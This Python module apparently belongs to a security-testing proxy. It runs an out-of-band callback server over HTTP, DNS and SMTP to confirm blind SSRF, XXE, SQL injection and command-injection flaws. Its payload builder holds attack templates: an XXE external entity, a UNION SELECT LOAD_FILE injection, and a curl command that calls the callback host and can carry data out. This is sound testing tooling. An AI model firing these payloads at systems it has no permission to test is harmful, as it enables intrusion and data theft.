"""The collaborator.

The collaborator is a small server that waits to be called. A payload that
points at it makes the target reach out, and whatever arrives is written down,
so a blind flaw can be shown to be there.

Three kinds of call are answered:

* an **HTTP** call, which is what a blind SSRF, a blind XXE or a blind RCE
  makes;
* a **DNS** query, which is what a blind SQLi often makes, and what a target
  does when it cannot reach the collaborator over HTTP;
* an **SMTP** call, which is what a target does when it is told to send mail.

Every call carries a token, and the token is what ties a call to the payload
that caused it. The payload is built here as well, so the token in the
payload and the token in the call are always the same one.
"""

from __future__ import annotations

import asyncio
import contextlib
import ipaddress
import secrets
import struct
import time
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import quote

__all__ = [
    "Collaborator",
    "Interaction",
    "COLLABORATOR_KINDS",
    "KIND_LABELS",
    "build_payload",
    "new_token",
]

#: The kinds of payload the collaborator builds.
COLLABORATOR_KINDS: tuple[str, ...] = (
    "http",
    "xxe",
    "ssrf",
    "sqli",
    "rce",
    "dns",
    "smtp",
)

#: The labels the interface shows.
KIND_LABELS: dict[str, str] = {
    "http": "HTTP callback",
    "xxe": "Blind XXE",
    "ssrf": "Blind SSRF",
    "sqli": "Blind SQL injection",
    "rce": "Blind RCE",
    "dns": "DNS interaction",
    "smtp": "SMTP interaction",
}

_MAX_INTERACTIONS = 2000
_MAX_BODY = 64 * 1024


def new_token(length: int = 10) -> str:
    """A token that is hard to guess and easy to read back."""
    return secrets.token_hex(length // 2 or 5)[:length]


@dataclass
class Interaction:
    """One call that reached the collaborator."""

    id: str
    kind: str
    token: str
    at: float
    peer: str
    detail: str = ""
    headers: dict[str, str] = field(default_factory=dict)
    body: str = ""
    raw: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "kind": self.kind,
            "token": self.token,
            "at": self.at,
            "peer": self.peer,
            "detail": self.detail,
            "headers": dict(self.headers),
            "body": self.body,
            "raw": self.raw,
        }


# ------------------------------------------------------------------- payload


def build_payload(
    kind: str,
    target: str,
    token: str,
    base_url: str,
    hostname: str,
    smtp_host: str = "",
    extra: str = "",
) -> dict[str, Any]:
    """The payload that makes the target call the collaborator.

    The target is where the payload goes: a URL, a parameter, a header or a
    command. The extra text is appended to the callback, so a piece of data
    can be carried along with the call. The hostname is the domain the DNS
    names sit under.
    """
    suffix = f"&d={quote(extra)}" if extra else ""
    url = f"{base_url}/?id={token}{suffix}"
    name = f"{token}.{hostname}" if kind == "dns" else hostname
    mail = f"{token}@{smtp_host}" if smtp_host else f"{token}@collaborator"

    if kind == "http":
        payload = url
    elif kind == "ssrf":
        payload = target.replace("{COLLAB}", url) if "{COLLAB}" in target else url
    elif kind == "xxe":
        entity = f'<!ENTITY xxe SYSTEM "{url}">'
        payload = (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE root [\n'
            f"  {entity}\n"
            "]>\n"
            "<root>&xxe;</root>"
        )
    elif kind == "sqli":
        payload = _sql_payload(target, url)
    elif kind == "rce":
        payload = _rce_payload(target, url)
    elif kind == "dns":
        payload = name
    elif kind == "smtp":
        payload = f"mailto:{mail}"
    else:
        raise ValueError(f"unknown payload {kind!r}")

    return {
        "kind": kind,
        "label": KIND_LABELS.get(kind, kind),
        "token": token,
        "url": url,
        "hostname": name,
        "mail": mail,
        "payload": payload,
    }


def _sql_payload(target: str, url: str) -> str:
    """A SQL fragment that makes the database call out.

    The target is where the fragment goes, so a query can be built around it.
    """
    if target:
        return target.replace("{COLLAB}", url)
    return f"' UNION SELECT LOAD_FILE('{url}'),2,3-- -"


def _rce_payload(target: str, url: str) -> str:
    """A command that calls the collaborator."""
    if target:
        return target.replace("{COLLAB}", url)
    return f"curl -s '{url}'"


# ---------------------------------------------------------------------- dns


def _parse_dns(data: bytes) -> tuple[str, int]:
    """The name that was asked for and the type of the question."""
    if len(data) < 12:
        return "", 0
    index = 12
    labels: list[str] = []
    while index < len(data):
        length = data[index]
        index += 1
        if length == 0:
            break
        if length & 0xC0:  # a pointer, which a question does not use
            break
        labels.append(data[index : index + length].decode("latin-1", "replace"))
        index += length
    if index + 2 > len(data):
        return ".".join(labels), 0
    return ".".join(labels), struct.unpack("!H", data[index : index + 2])[0]


def _dns_response(data: bytes, address: str) -> bytes:
    """An answer that points the name at the given address."""
    if len(data) < 12:
        return b""
    transaction = struct.unpack("!H", data[0:2])[0]
    question = data[12:]
    if qtype_of(data) != 1:
        # Only an address is answered, so anything else is refused.
        return struct.pack("!HHHHHH", transaction, 0x8180 | 4, 0, 0, 0, 0)
    header = struct.pack("!HHHHHH", transaction, 0x8180, 1, 1, 0, 0)
    try:
        packed = ipaddress.IPv4Address(address).packed
    except ValueError:
        packed = ipaddress.IPv4Address("127.0.0.1").packed
    answer = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 60, 4) + packed
    return header + question + answer


def qtype_of(data: bytes) -> int:
    """The type of the question that was asked."""
    _, qtype = _parse_dns(data)
    return qtype


# -------------------------------------------------------------------- server


class Collaborator:
    """The server that waits to be called."""

    def __init__(self, config: Any, bus: Any = None) -> None:
        self.config = config
        self.bus = bus
        self.interactions: list[Interaction] = []
        self.http_port = 0
        self.dns_port = 0
        self.smtp_port = 0
        self._http: asyncio.Server | None = None
        self._smtp: asyncio.Server | None = None
        self._dns: Any = None
        self._running = False

    # ------------------------------------------------------------- lifecycle

    async def start(self) -> None:
        """Open the listeners.

        The HTTP listener is the one that matters, so a failure to open it is
        reported; the DNS and the SMTP listeners are a bonus and their
        absence does not stop the collaborator from working.
        """
        if self._running:
            return
        host = self.config.host or "127.0.0.1"
        try:
            self._http = await asyncio.start_server(
                self._handle_http, host, self.config.port
            )
        except OSError as exc:
            raise RuntimeError(
                f"the collaborator cannot listen on {host}:{self.config.port}: {exc}"
            ) from exc
        self.http_port = self._http.sockets[0].getsockname()[1] if self._http.sockets else 0
        self.smtp_port = await self._open_smtp(host)
        self.dns_port = await self._open_dns(host)
        self._running = True
        self._emit("collaborator.started", port=self.http_port)

    async def stop(self) -> None:
        """Close the listeners."""
        self._running = False
        for server in (self._http, self._smtp):
            if server is not None:
                server.close()
                with contextlib.suppress(Exception):  # closing must not raise
                    await server.wait_closed()
        self._http = None
        self._smtp = None
        if self._dns is not None:
            self._dns.close()
            self._dns = None
        self._emit("collaborator.stopped")

    async def _open_dns(self, host: str) -> int:
        """Open the DNS listener, on the low port when that is allowed."""
        loop = asyncio.get_running_loop()
        wanted = self.config.dns_port
        for candidate in [port for port in (wanted, 53, 15353) if port]:
            try:
                transport, _ = await loop.create_datagram_endpoint(
                    lambda: self._make_dns_protocol(host),
                    local_addr=(host, candidate),
                )
            except OSError:
                continue
            self._dns = transport
            return candidate
        return 0

    async def _open_smtp(self, host: str) -> int:
        """Open the SMTP listener, on the usual port when that is allowed.

        A target that is told to send mail sends it to port 25, so that port
        is tried first. The listener is not opened on a free port instead: a
        mail address cannot carry a port, so a listener on a random port could
        never be reached by the target.
        """
        wanted = self.config.smtp_port
        for candidate in [port for port in (wanted, 25, 2525) if port]:
            try:
                server = await asyncio.start_server(self._handle_smtp, host, candidate)
            except OSError:
                continue
            self._smtp = server
            return candidate
        return 0

    # ------------------------------------------------------------- addresses

    @property
    def public_host(self) -> str:
        """The address the target should call."""
        return self.config.public_host or self.config.host or "127.0.0.1"

    @property
    def base_url(self) -> str:
        """The address of the collaborator as a URL."""
        return f"http://{self.public_host}:{self.http_port}"

    @property
    def domain(self) -> str:
        """The domain the DNS names sit under."""
        return self.config.domain or "intercept.local"

    def hostname(self, token: str) -> str:
        """The name that a DNS query carries."""
        return f"{token}.{self.domain}"

    def status(self) -> dict[str, Any]:
        """What the collaborator is listening on."""
        return {
            "running": self._running,
            "host": self.config.host,
            "public_host": self.public_host,
            "port": self.http_port,
            "url": self.base_url,
            "dns_port": self.dns_port,
            "dns_server": f"{self.public_host}:{self.dns_port}" if self.dns_port else "",
            "domain": self.domain,
            "smtp_port": self.smtp_port,
            "smtp_host": self.public_host if self.smtp_port else "",
            "smtp_server": f"{self.public_host}:{self.smtp_port}" if self.smtp_port else "",
            "interactions": len(self.interactions),
            "wait": float(getattr(self.config, "wait", 5.0)),
        }

    # ------------------------------------------------------------- payloads

    def payload(self, kind: str, target: str = "", extra: str = "") -> dict[str, Any]:
        """A payload that makes the target call the collaborator."""
        token = new_token()
        data = build_payload(
            kind,
            target,
            token,
            self.base_url,
            self.domain,
            self.public_host if self.smtp_port else "",
            extra,
        )
        # A name is only useful when the target knows where to ask, and a mail
        # address is only useful when the target knows where to send it.
        data["dns_server"] = self.status()["dns_server"]
        data["smtp_server"] = self.status()["smtp_server"]
        return data

    # ---------------------------------------------------------- interactions

    def clear(self) -> int:
        """Throw the recorded calls away."""
        count = len(self.interactions)
        self.interactions.clear()
        return count

    def interactions_for(self, token: str) -> list[Interaction]:
        """The calls that carried a token."""
        if not token:
            return []
        return [item for item in self.interactions if item.token == token]

    def find(self, tokens: list[str]) -> Interaction | None:
        """The first call that carried one of the tokens."""
        wanted = {token for token in tokens if token}
        if not wanted:
            return None
        for item in reversed(self.interactions):
            if item.token in wanted:
                return item
        return None

    async def wait_for(
        self,
        tokens: list[str],
        timeout: float | None = None,
        interval: float = 0.1,
    ) -> Interaction | None:
        """Wait for a call that carries one of the tokens.

        A blind flaw does not answer in the request that caused it, so the wait
        is what turns a call into a finding. The wait is short by default,
        because a scan that stalls on every parameter is not useful. The
        length of it is a setting, so a slow target can be given more time.
        """
        if timeout is None:
            timeout = float(getattr(self.config, "wait", 5.0))
        deadline = time.monotonic() + max(0.0, timeout)
        while True:
            found = self.find(tokens)
            if found is not None:
                return found
            if time.monotonic() >= deadline:
                return None
            await asyncio.sleep(interval)

    def _record(self, interaction: Interaction) -> None:
        self.interactions.append(interaction)
        if len(self.interactions) > _MAX_INTERACTIONS:
            del self.interactions[: len(self.interactions) - _MAX_INTERACTIONS]
        self._emit("collaborator.interaction", interaction=interaction.to_dict())

    def _emit(self, event: str, **data: Any) -> None:
        if self.bus is not None:
            self.bus.emit(event, **data)

    # ----------------------------------------------------------------- http

    async def _handle_http(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        from intercept.proxy.http1 import HTTPParseError, read_message
        from intercept.proxy.stream import BufferedStream

        peer = _peer_of(writer)
        message = None
        try:
            message = await asyncio.wait_for(
                read_message(BufferedStream(reader), is_response=False), timeout=10
            )
        except (HTTPParseError, TimeoutError, ConnectionError):
            message = None
        except Exception:  # noqa: BLE001 - a broken call must not stop the server
            message = None

        if message is not None:
            headers = {name: value for name, value in message.headers}
            body = message.body[:_MAX_BODY]
            query = message.start_line.split(" ")[1] if " " in message.start_line else ""
            token = _token_from(query, headers)
            self._record(
                Interaction(
                    id=new_token(16),
                    kind="http",
                    token=token,
                    at=time.time(),
                    peer=peer,
                    detail=message.start_line,
                    headers=headers,
                    body=body.decode("utf-8", "replace"),
                    raw=message.raw[:_MAX_BODY].decode("latin-1", "replace"),
                )
            )

        try:
            writer.write(
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/plain; charset=utf-8\r\n"
                b"Content-Length: 12\r\n"
                b"Connection: close\r\n\r\n"
                b"collaborator\n"
            )
            await writer.drain()
        except (ConnectionError, OSError):
            pass
        finally:
            with contextlib.suppress(Exception):
                writer.close()

    # ------------------------------------------------------------------ dns

    def _make_dns_protocol(self, host: str) -> Any:
        """The protocol that answers the DNS queries."""
        address = self.config.dns_address or "127.0.0.1"
        collaborator = self

        class Protocol(asyncio.DatagramProtocol):
            def __init__(self) -> None:
                self.transport: Any = None

            def connection_made(self, transport: Any) -> None:
                self.transport = transport

            def datagram_received(self, data: bytes, addr: tuple[str, int]) -> None:
                name, qtype = _parse_dns(data)
                token = name.split(".")[0] if name else ""
                asyncio.get_running_loop().create_task(
                    self._answer(data, addr, name, qtype, token)
                )

            async def _answer(
                self,
                data: bytes,
                addr: tuple[str, int],
                name: str,
                qtype: int,
                token: str,
            ) -> None:
                transport = self.transport
                if transport is None:
                    return
                with contextlib.suppress(OSError):
                    transport.sendto(_dns_response(data, address), addr)
                collaborator._record(
                    Interaction(
                        id=new_token(16),
                        kind="dns",
                        token=token,
                        at=time.time(),
                        peer=f"{addr[0]}:{addr[1]}",
                        detail=name,
                        headers={"type": str(qtype)},
                    )
                )

        return Protocol()

    # ----------------------------------------------------------------- smtp

    async def _handle_smtp(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ) -> None:
        peer = _peer_of(writer)
        mail_from = ""
        recipients: list[str] = []
        data: list[str] = []
        in_data = False
        token = ""

        try:
            writer.write(b"220 collaborator ESMTP\r\n")
            await writer.drain()
            while True:
                line = await asyncio.wait_for(reader.readline(), timeout=20)
                if not line:
                    break
                text = line.decode("utf-8", "replace").strip()
                if in_data:
                    if text == ".":
                        in_data = False
                        writer.write(b"250 OK\r\n")
                        await writer.drain()
                        self._record(
                            Interaction(
                                id=new_token(16),
                                kind="smtp",
                                token=token or _token_from(mail_from + " ".join(recipients)),
                                at=time.time(),
                                peer=peer,
                                detail=f"from {mail_from or '?'} to {', '.join(recipients) or '?'}",
                                headers={"mail-from": mail_from, "rcpt-to": ", ".join(recipients)},
                                body="\n".join(data),
                            )
                        )
                        data = []
                        continue
                    data.append(text)
                    continue

                upper = text.upper()
                if upper.startswith(("EHLO", "HELO")):
                    writer.write(b"250 collaborator\r\n")
                elif upper.startswith("MAIL FROM"):
                    mail_from = _address_of(text)
                    writer.write(b"250 OK\r\n")
                elif upper.startswith("RCPT TO"):
                    recipient = _address_of(text)
                    recipients.append(recipient)
                    token = token or recipient.split("@")[0]
                    writer.write(b"250 OK\r\n")
                elif upper.startswith("DATA"):
                    in_data = True
                    writer.write(b"354 End data with <CR><LF>.<CR><LF>\r\n")
                elif upper.startswith("RSET"):
                    mail_from = ""
                    recipients = []
                    writer.write(b"250 OK\r\n")
                elif upper.startswith("QUIT"):
                    writer.write(b"221 Bye\r\n")
                    await writer.drain()
                    break
                else:
                    writer.write(b"250 OK\r\n")
                await writer.drain()
        except (TimeoutError, ConnectionError, OSError):
            pass
        finally:
            with contextlib.suppress(Exception):
                writer.close()


def _peer_of(writer: asyncio.StreamWriter) -> str:
    """The address the call came from."""
    try:
        peer = writer.get_extra_info("peername")
    except Exception:  # noqa: BLE001
        return ""
    if not peer:
        return ""
    return f"{peer[0]}:{peer[1]}"


def _token_from(query: str, headers: dict[str, str]) -> str:
    """The token that the caller carried, if it carried one."""
    for name, value in headers.items():
        if name.lower() in {"x-collaborator-token", "x-token"}:
            return value.strip()
    if "id=" in query:
        tail = query.split("id=", 1)[1]
        return tail.split("&")[0].split(" ")[0].strip()
    return ""


def _address_of(text: str) -> str:
    """The address inside an SMTP command."""
    start = text.find("<")
    end = text.find(">")
    if start != -1 and end > start:
        return text[start + 1 : end]
    parts = text.split(":", 1)
    return parts[1].strip() if len(parts) == 2 else text
